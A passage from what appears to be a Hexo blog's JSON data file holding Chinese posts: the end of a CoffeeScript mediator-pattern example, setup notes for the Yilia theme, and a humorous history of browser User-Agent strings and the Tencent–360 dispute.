model。当两个player得分时，mediator执行played，收集两方的分数，构造成score对象，并将这score对象交由scoreboard展示。keypress则是用于判断怎样才算得分：\n```coffeescript\n\tmediator = \n\t\tplayers:{}\n\t\tsetup:->\n\t\t\tplayers = @players\n\t\t\tplayers.home = new Player 'Home'\n\t\t\tplayers.guest = new Player 'Guest'\n\t\tplayed:->\n\t\t\tplayers = @players\n\t\t\tscore = \n\t\t\t\tHome: players.home.points\n\t\t\t\tGuest:players.guest.points\n\t\t\tscoreboard.update score\n\t\tkeypress:(e)->\n\t\t\te = e|| window.event\n\t\t\tkeycode = e.which\n\t\t\tif keycode is 102\n\t\t\t\tmediator.players.home.play()\n\t\t\t\treturn\n\t\t\tif keycode is 106\n\t\t\t\tmediator.players.guest.play()\n\t\t\t\treturn\n```\n最后执行，运行程序：\n```coffeescript\n\tmediator.setup()\n\twindow.onkeypress = mediator.keypress\n```\n\n##**小分享心得**\n中介者模式将控制集中化，colleague对象之间解耦，不必维护各自之间的网状通信，但mediator承受了所有colleague提供过来的信息，肯定会相对复杂。如何优化mediator也会成为一个课题。中介者模式有点像一对多的模型，一个mediator对应多个colleague，而如果现实模型是多对多的，中介者模型视复杂度来说不一定适合。","slug":"mediator-model","updated":1409150490000,"excerpt":"<p><img src=\"/assets/blogImg/mediator1.jpg\" alt=\"实况足球\">   </p>\n<blockquote>\n<p>你需要一种设计模式，一定是哪里出问题了。这问题是指语言天生缺陷，不得不去寻找一种通用的解决方案。</p>\n</blockquote>\n<p>程序设计最后的终点，就是要找到一种解决方案来解决问题。这句话正确无疑。但我又想起有个冷笑话，A对B说：我教你怎么去赢这盘象棋，B问怎样，A回答说：吃掉对方的“帅”就赢了啊。略去中间的过程，直接描述到结果，这其实是毫无意义的。而设计模式，又恰恰关乎中间解决问题的过程。<br>","_id":"zpsfn3ys1k8e4hun","categories":[],"photos":[],"link":""},{"layout":"post","title":"Hexo主题Yilia","date":1409472180000,"comments":true,"tags":["q42jg8fjwg8u8ovb","6pi7ylzkuavucony"],"content":"<p><a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\" rel=\"external\">hexo-theme-yilia</a> 是为 <a href=\"https://github.com/tommy351/hexo\" target=\"_blank\" rel=\"external\">hexo</a> 2.4+制作的主题。<br>响应式设计，风格简约。</p>\n<p>终于从octopress迁移到hexo。Yilia是自己设计的主题，分享之，有爱请自取。关于主题：</p>\n<ol>\n<li>我喜欢简约。所以标签云，搜索框都拿掉了</li>\n<li>接地气一点。所以用上了jiathis分享，友言评论，以及baidu的cdn</li>\n<li>让大家把注意力放到内容上。这是本主题设计初衷</li>\n<li>主题不支持IE6，7，8。以后也不会</li>\n</ol>\n<a id=\"more\"></a>\n\n<h2 id=\"一、使用\">一、使用</h2>\n<h4 id=\"1-_安装\"><strong>1. 安装</strong></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</div></pre></td></tr></table></figure>\n\n<h4 id=\"2-_配置\"><strong>2. 配置</strong></h4>\n<p>修改hexo根目录下的 <code>_config.yml</code> ： <code>theme: yilia</code></p>\n<h4 id=\"3-_更新\"><strong>3. 更新</strong></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> themes/yilia</div><div class=\"line\">git pull</div></pre></td></tr></table></figure>\n\n<h2 id=\"二、外观\">二、外观</h2>\n<h4 id=\"宽屏\"><strong>宽屏</strong></h4>\n<p><img src=\"http://littendomo.sinaapp.com/yilia/yilia-pc1.png\" alt=\"宽屏\">        </p>\n<h4 id=\"宽屏文字\"><strong>宽屏文字</strong></h4>\n<p><img src=\"http://littendomo.sinaapp.com/yilia/yilia-pc2.png\" alt=\"宽屏文字\">   </p>\n<h4 id=\"窄屏\"><strong>窄屏</strong></h4>\n<p><img src=\"http://littendomo.sinaapp.com/yilia/yilia-pc3.png\" alt=\"窄屏\">     </p>\n<h4 id=\"同步instagram\"><strong>同步instagram</strong></h4>\n<p><img src=\"http://littendomo.sinaapp.com/yilia/yilia-pc4.png\" alt=\"同步instagram\"></p>\n<h4 id=\"移动端\"><strong>移动端</strong></h4>\n<p><img src=\"http://littendomo.sinaapp.com/yilia/yilia-mobile.png\" alt=\"移动端\"><br><img src=\"http://littendomo.sinaapp.com/yilia/yilia-mobile2.png\" alt=\"移动端\">   </p>\n<h2 id=\"三、配置\">三、配置</h2>\n<p>主题配置文件在主目录下的<code>_config.yml</code>：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\"># Header</span></div><div class=\"line\"><span class=\"label\">menu:</span></div><div class=\"line\">  主页: /</div><div class=\"line\">  所有文章: /archives</div><div class=\"line\">  <span class=\"preprocessor\"># 随笔: /tags/随笔</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\"># SubNav</span></div><div class=\"line\"><span class=\"label\">subnav:</span></div><div class=\"line\">  github: <span class=\"string\">\"https://github.com/litten\"</span></div><div class=\"line\">  weibo: <span class=\"string\">\"http://weibo.com/litten225\"</span></div><div class=\"line\">  rss: <span class=\"string\">\"http://feed.feedsky.com/litten\"</span></div><div class=\"line\">  <span class=\"preprocessor\"># facebook: \"/\"</span></div><div class=\"line\">  <span class=\"preprocessor\"># google: \"/\"</span></div><div class=\"line\">  <span class=\"preprocessor\"># twitter: \"/\"</span></div><div class=\"line\">  <span class=\"preprocessor\"># linkedin: \"/\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"label\">rss:</span> /atom.xml</div><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\"># Content</span></div><div class=\"line\"><span class=\"label\">excerpt_link:</span> more</div><div class=\"line\"><span class=\"label\">fancybox:</span> true</div><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\"># Miscellaneous</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"label\">favicon:</span> /favicon.png</div><div class=\"line\"></div><div class=\"line\"><span class=\"label\">avatar:</span> <span class=\"string\">\"https://avatars2.githubusercontent.com/u/2024949?v=2&s=150\"</span></div><div class=\"line\"><span class=\"label\">share:</span> true</div><div class=\"line\"><span class=\"label\">duoshuo:</span> true</div></pre></td></tr></table></figure>\n\n","source":"_posts/hexo-theme-yilia.markdown","raw":"---\nlayout: post\ntitle: \"Hexo主题Yilia\"\ndate: 2014-08-31 16:03\ncomments: true\ntags: \n\t- 主题 \n\t- hexo\n---       \n\n[hexo-theme-yilia](https://github.com/litten/hexo-theme-yilia) 是为 [hexo](https://github.com/tommy351/hexo) 2.4+制作的主题。     \n响应式设计，风格简约。\n\n终于从octopress迁移到hexo。Yilia是自己设计的主题，分享之，有爱请自取。关于主题：\n\n1. 我喜欢简约。所以标签云，搜索框都拿掉了\n2. 接地气一点。所以用上了jiathis分享，友言评论，以及baidu的cdn\n3. 让大家把注意力放到内容上。这是本主题设计初衷\n4. 主题不支持IE6，7，8。以后也不会\n\n<!-- more -->\n\n##一、使用\n\n####**1. 安装**\n\n``` bash\n$ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia\n```\n\n####**2. 配置**\n\n修改hexo根目录下的 `_config.yml` ： `theme: yilia`\n\n####**3. 更新**\n\n``` bash\ncd themes/yilia\ngit pull\n```\n\n##二、外观\n\n####**宽屏**\n![宽屏](http://littendomo.sinaapp.com/yilia/yilia-pc1.png)        \n\n####**宽屏文字**\n![宽屏文字](http://littendomo.sinaapp.com/yilia/yilia-pc2.png)   \n\n####**窄屏**\n![窄屏](http://littendomo.sinaapp.com/yilia/yilia-pc3.png)     \n\n####**同步instagram**\n![同步instagram](http://littendomo.sinaapp.com/yilia/yilia-pc4.png)\n\n####**移动端**\n![移动端](http://littendomo.sinaapp.com/yilia/yilia-mobile.png)\n![移动端](http://littendomo.sinaapp.com/yilia/yilia-mobile2.png)   \n\n##三、配置\n\n主题配置文件在主目录下的`_config.yml`：\n\n```\n# Header\nmenu:\n  主页: /\n  所有文章: /archives\n  # 随笔: /tags/随笔\n\n# SubNav\nsubnav:\n  github: \"https://github.com/litten\"\n  weibo: \"http://weibo.com/litten225\"\n  rss: \"http://feed.feedsky.com/litten\"\n  # facebook: \"/\"\n  # google: \"/\"\n  # twitter: \"/\"\n  # linkedin: \"/\"\n\nrss: /atom.xml\n\n# Content\nexcerpt_link: more\nfancybox: true\n\n# Miscellaneous\n\nfavicon: /favicon.png\n\navatar: \"https://avatars2.githubusercontent.com/u/2024949?v=2&s=150\"\nshare: true\nduoshuo: true\n```","slug":"hexo-theme-yilia","updated":1409474902000,"excerpt":"<p><a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\" rel=\"external\">hexo-theme-yilia</a> 是为 <a href=\"https://github.com/tommy351/hexo\" target=\"_blank\" rel=\"external\">hexo</a> 2.4+制作的主题。<br>响应式设计，风格简约。</p>\n<p>终于从octopress迁移到hexo。Yilia是自己设计的主题，分享之，有爱请自取。关于主题：</p>\n<ol>\n<li>我喜欢简约。所以标签云，搜索框都拿掉了</li>\n<li>接地气一点。所以用上了jiathis分享，友言评论，以及baidu的cdn</li>\n<li>让大家把注意力放到内容上。这是本主题设计初衷</li>\n<li>主题不支持IE6，7，8。以后也不会</li>\n</ol>\n","_id":"6vyj8qonhyxhac9o","categories":[],"photos":[],"link":""},{"layout":"post","title":"浏览器野史 UserAgent列传（下）","date":1412501160000,"comments":true,"tags":["ejm72ndmomwgbvme","tl6ojb17wh8ofhtp"],"brief":"关于UserAgent的一篇野史","content":"<p><img src=\"/assets/blogImg/browser-history2.jpg\" alt=\"其实应该叫做浏览器约架史\">    </p>\n<p>前篇<a href=\"/2014/09/26/history-of-browser-useragent/\">《浏览器野史 UserAgent列传（上）》</a></p>\n<h3 id=\"六、师夷长技\">六、师夷长技</h3>\n<p>前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。</p>\n<a id=\"more\"></a>\n\n<p>真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？<br>但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。<br>先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。<br>行行行。我已懒得理这帮大神…</p>\n<p>可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。<br>结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成<code>Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)</code>…<br>这就是现代浏览器里<code>like Gecko</code>这一萌词的由来。</p>\n<p>就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。<br>KHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”…</p>\n<h3 id=\"七、世界大战\">七、世界大战</h3>\n<p>首先是IE冷静下来了，他觉得，你们不带这么玩的？<br>就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？<br>在IE6，它明确自己UserAgent为<code>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)</code>。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。</p>\n<p>但事态已经不可收拾。</p>\n<p>Opera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了<code>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51</code>，<code>Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51</code>，<code>Opera/9.51 (Windows NT 5.1; U; en)</code>三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！</p>\n<p>其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。</p>\n<p>与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为<code>Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5</code>。</p>\n<p>有人就会问了，不是Webkit内核吗，怎么还有<code>KHTML, like Gecko</code>？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。</p>\n<p>后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为<code>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13</code>。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。</p>\n<p>因此，请让我一口气说完下面这一段：<br>Chrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。</p>\n<p>这就是整个UserAgent世界大战的格局…</p>\n<h3 id=\"八、军阀混战\">八、军阀混战</h3>\n<p>将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。<br>360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。<br>注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。</p>\n<p>利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容<br>利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览<br>把两个内核都包起来，就可以说：智能双核</p>\n<p>是微创新！读书人的事，能叫偷吗？</p>\n<p>在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。</p>\n<p>但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品…</p>\n<p>话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。<br>大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。</p>\n<p>前者像QQ浏览器：<code>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)</code>。<br>后者像猎豹：<code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER</code>。<br>当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。</p>\n<p>如此的混战格局，这厢的IE和Chome想必也是醉了。</p>\n<h3 id=\"九、国共内战\">九、国共内战</h3>\n<p>适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。</p>\n<p>有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？</p>\n<p>因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。</p>\n<p>战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！<br>2011年11月3日，腾讯网站封杀360浏览器<br>2011年11月4日，360浏览器访问量仅为昨日一半<br>2011年11月5日，360浏览器访问量几乎为0</p>\n<p>有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！<br>意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧…</p>\n<p>这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。</p>\n<h3 id=\"十、明日边缘\">十、明日边缘</h3>\n<p>看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。<br>不过，这道理并不全对。别忘了，移动侧也是有浏览器的。<br>在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫<code>诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B)</code>，<code>PHILIPS755 ObigoInternetBrowser/2.0</code> 这样，有甚者连浏览器叫什么都不带 <code>TCL-3199</code>，<code>三星 E618 SEC-SGHE618</code>。</p>\n<p>这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。<br>web世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅<a href=\"http://www.w3.org/TR/UAAG/\" target=\"_blank\" rel=\"external\">User Agent Accessibility Guidelines</a>。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。<br>W3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。</p>\n<h3 id=\"彩蛋\">彩蛋</h3>\n<p>那么，我们的故事接近尾声。还有一些有趣的小彩蛋。</p>\n<ol>\n<li>Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。              </li>\n<li>淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。                </li>\n<li>360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。                </li>\n<li>微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。</li>\n</ol>\n<hr>\n<p>End.<br>Litten 2014.10.5</p>\n","source":"_posts/history-of-browser-useragent2.markdown","raw":"---\nlayout: post\ntitle: \"浏览器野史 UserAgent列传（下）\"\ndate: 2014-10-05 17:26\ncomments: true\ntags:\n     - web\n     - 浏览器\nbrief: \"关于UserAgent的一篇野史\"\n\n---    \n\n![其实应该叫做浏览器约架史](/assets/blogImg/browser-history2.jpg)    \n\n\n前篇[《浏览器野史 UserAgent列传（上）》](/2014/09/26/history-of-browser-useragent/)\n\n###六、师夷长技\n\n前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。\n\n<!--more-->\n\n真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？\n但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。\n先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。\n行行行。我已懒得理这帮大神…\n\n可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。\n结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成``Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)``…\n这就是现代浏览器里``like Gecko``这一萌词的由来。\n\n就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。\nKHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”…\n\n###七、世界大战\n\n首先是IE冷静下来了，他觉得，你们不带这么玩的？\n就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？\n在IE6，它明确自己UserAgent为``Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)``。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。\n\n但事态已经不可收拾。\n\nOpera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了``Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51``，``Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51``，``Opera/9.51 (Windows NT 5.1; U; en)``三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！\n\n其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。\n\n与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为``Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5``。\n\n有人就会问了，不是Webkit内核吗，怎么还有``KHTML, like Gecko``？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。\n\n后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为``Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13``。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。\n\n因此，请让我一口气说完下面这一段：\nChrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。\n\n这就是整个UserAgent世界大战的格局…\n\n###八、军阀混战\n\n将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。\n360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。\n注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。\n\n利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容\n利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览\n把两个内核都包起来，就可以说：智能双核\n\n是微创新！读书人的事，能叫偷吗？\n\n在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。\n\n但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品…\n\n话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。\n大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。\n\n前者像QQ浏览器：``Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)``。             \n后者像猎豹：``Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER``。\n当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。\n\n如此的混战格局，这厢的IE和Chome想必也是醉了。\n\n###九、国共内战\n\n适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。\n\n有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？\n\n因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。\n\n战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！\n2011年11月3日，腾讯网站封杀360浏览器\n2011年11月4日，360浏览器访问量仅为昨日一半\n2011年11月5日，360浏览器访问量几乎为0\n\n有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！\n意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧…\n\n这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。\n\n###十、明日边缘\n\n看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。\n不过，这道理并不全对。别忘了，移动侧也是有浏览器的。\n在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫``诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B) ``，``PHILIPS755 ObigoInternetBrowser/2.0`` 这样，有甚者连浏览器叫什么都不带 ``TCL-3199``，``三星 E618 SEC-SGHE618``。\n\n这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。\nweb世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅[User Agent Accessibility 